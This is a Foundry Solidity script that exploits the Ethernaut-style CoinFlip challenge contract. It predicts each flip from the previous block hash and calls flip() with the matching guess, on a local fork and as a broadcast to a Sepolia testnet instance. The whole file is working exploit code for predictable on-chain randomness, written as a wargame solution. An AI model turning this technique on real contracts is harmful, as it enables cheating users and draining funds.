// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
// import "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract ForkExp is Script {
    // $ forge script script/CoinFlipExp.s.sol:ForkExp
    // $ forge script script/CoinFlipExp.s.sol:ForkExp --fork-url $SEPOLIA_RPC_URL -vvvvv
    // ./scriptbash/CoinFlipExp.sh

    ICoinFlip public coinFlipInstance = ICoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function run() external {
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            coinFlipInstance = ICoinFlip(address(new CoinFlip()));
            vm.stopPrank();
        } else if (chainId == 11155111) {
            coinFlipInstance = ICoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);
            vm.roll(block.number - 1000); // fork 时，block.number = 1000
        } else {
            return;
        }

        vm.startPrank(attacker);
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        for (uint256 i = 0; i < 10; i++) {
            new CoinFlipAttack(address(coinFlipInstance)).attack(); // 调用攻击合约的攻击函数
            // 推进区块，保证 blockhash(block.number - 1) 改变
            vm.roll(block.number + 1); // block.number = block.number + 1
            vm.warp(block.timestamp + 15); // block.timestamp = block.timestamp + 15
        }
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        vm.stopPrank();
    }
}

contract onChainExp is Script {
    // $ forge script script/CoinFlipExp.s.sol:onChainExp --fork-url $SEPOLIA_RPC_URL -vvvvv
    // $ forge script script/CoinFlipExp.s.sol:onChainExp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
    // $ make coinFlipExp ARGS='--network sepolia'
    // ./scriptbash/CoinFlipExp.sh

    ICoinFlip public coinFlipInstance = ICoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);

    function run() external {
        vm.startBroadcast();
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        CoinFlipAttack coinFlipAttack = new CoinFlipAttack(address(coinFlipInstance));
        coinFlipAttack.attack();
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}

contract CoinFlipAttack {
    // success event
    event SuccessEvent();
    // fail event
    event CatchEvent(string message);
    event CatchByte(bytes data);

    CoinFlip public coinFlipInstance;

    constructor(address _coinFlipInstance) {
        coinFlipInstance = CoinFlip(_coinFlipInstance);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        // coinFlipInstance.flip(side);
        try coinFlipInstance.flip(side) returns (bool result) {
            if (result) {
                console2.log("Flip successful with guess:", side);
                emit SuccessEvent();
            } else {
                console2.log("Flip failed with guess:", side);
            }
        } catch Error(string memory reason) {
            emit CatchEvent(reason);
        } catch (bytes memory reason) {
            emit CatchByte(reason);
        }
    }
}
